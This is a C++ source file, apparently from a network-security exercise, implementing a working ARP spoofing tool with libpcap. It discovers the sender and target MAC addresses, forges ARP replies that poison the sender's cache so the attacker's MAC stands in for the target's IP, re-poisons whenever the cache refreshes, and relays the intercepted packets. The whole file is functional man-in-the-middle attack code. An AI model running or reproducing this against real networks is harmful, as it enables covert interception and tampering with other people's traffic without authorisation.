#include "arp_spoofing.h"
#include <unistd.h>
#include <signal.h>

bool loop = true;

void sig_handler(int signo){
    loop = false;
    printf("Turn off arpspoofing\n");
}

Address* arp_spoofing::SetAddress(const u_char* ip){
    arp_packet* REQ_PACKET = MakeRequestPacket(ip);
    arp_packet* REP_PACKET;
    Address* addr;
    u_char* spacket = REQ_PACKET->ToPacket60();

    while(true){
        pcap_sendpacket(handle, spacket, 60);

        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        if (arpcd::IsReplyPacket(packet, ip)){
            REP_PACKET = new arp_packet(packet);
            addr = new Address(REP_PACKET->GetEthernet()->GetSoruce(), ip);
            printf("Catch Gateway REPLY\nMac: ");
            print(addr->GetMacAddress(), MAC_SIZE);
            break;
        }
    }

    delete[] spacket;
    delete REQ_PACKET;
    delete REP_PACKET;
    return addr;
}


void arp_spoofing::SetAttacker(){
    Attacker = new Address(getinfo::get_my_mac_address(Dev), getinfo::get_my_ipv4_address(Dev));
}

void arp_spoofing::Init(const char* sender, const char* target){
    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(Dev, BUFSIZ, 1, 1, errbuf);
    u_char* sender_hex = conv::ipv4_to_hex(sender);
    u_char* target_hex = conv::ipv4_to_hex(target);

    printf("Sender IP: %s\nTarget IP: %s\n", sender, target);
    printf("[-] Set Attacker...\n");
    SetAttacker();

    printf("[-] Set Sender..\n");
    Sender = SetAddress(sender_hex);

    printf("[-] Set Target...\n");
    Target = SetAddress(target_hex);

    delete[] target_hex;
    delete[] sender_hex;
    signal(SIGINT, sig_handler);
}

void arp_spoofing::ExecuteArpSpoofing() {
    u_char* attack_packet = MakeAttackPacket()->ToPacket60();
    pcap_sendpacket(handle, attack_packet, 60);

    printf("\n\nStart Relay\n");
    while(loop){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) return;
		if (arpcd::IsArp(&packet[12])){
        	if(arpcd::IsBroadcastArp(packet, Sender->GetMacAddress()) ||
            	    arpcd::IsCacheUpdate(packet, Target->GetIpAddress(), Sender->GetMacAddress())){
           		pcap_sendpacket(handle, attack_packet, 58);
        	}
		}
        else if (pcktcd::IsSenderPacket(packet, Sender->GetMacAddress())){
            int packet_size = (int)header->len;
            u_char* relay_packet = new u_char[packet_size];
            u_char* attacker_mac = Attacker->GetMacAddress();
            u_char* target_mac = Target->GetMacAddress();

            print(target_mac, MAC_SIZE);
            memcpy(relay_packet, packet, (size_t)packet_size);
            for (int i=0; i < 6; i++) {
                relay_packet[i + 6] = attacker_mac[i];
                relay_packet[i] = target_mac[i];
            }

            pcap_sendpacket(handle, relay_packet, packet_size);
            printf("Relay Packet: [%d]\n", packet_size);
            delete[] relay_packet;
        }
    }

    delete[] attack_packet;
    pcap_close(handle);
}

arp_packet* arp_spoofing::MakeAttackPacket(){
    u_char type[2] = {0x08, 0x06};

    ethernet_header* etherh = new ethernet_header(Sender->GetMacAddress(),
                                                  Attacker->GetMacAddress(),
                                                  type);

    u_char hardType[2] = {0x00, 0x01};
    u_char protType[2] = {0x08, 0x00};
    u_char opcode[2] = {0x00, 0x02};

    Hardware* hard = new Hardware(hardType, 0x06);
    Protocol* prot = new Protocol(protType, 0x04);

    Address* send = new Address(Attacker->GetMacAddress(), Target->GetIpAddress());
    Address* trag = new Address(Sender->GetMacAddress(), Sender->GetIpAddress());

    arp_header* arph = new arp_header(hard, prot, opcode, send, trag);
    return new arp_packet(etherh, arph);
}

arp_packet* arp_spoofing::MakeRequestPacket(const u_char* ip){
    u_char type[2] = {0x08, 0x06};

    ethernet_header* etherh = new ethernet_header(conv::mac_to_hex("ff:ff:ff:ff:ff:ff"),
                                                  Attacker->GetMacAddress(),
                                                  type);

    u_char hardType[2] = {0x00, 0x01};
    u_char protType[2] = {0x08, 0x00};
    u_char opcode[2] = {0x00, 0x01};

    Hardware* hard = new Hardware(hardType, 0x06);
    Protocol* prot = new Protocol(protType, 0x04);
    Address* send = new Address(Attacker->GetMacAddress(), Attacker->GetIpAddress());
    Address* trag = new Address(conv::mac_to_hex("00:00:00:00:00:00"), ip);

    arp_header* arph = new arp_header(hard, prot, opcode, send, trag);

    return new arp_packet(etherh, arph);
}

arp_spoofing::arp_spoofing(const char* dev, const char* sender, char* target){
    Dev = new char[strlen(dev) + 1];
    strcpy(Dev, dev);
    Init(sender, target);
}

arp_spoofing::arp_spoofing(){
}
arp_spoofing::~arp_spoofing(){
    delete Dev;
    delete Attacker;
    delete Sender;
    delete Target;
}
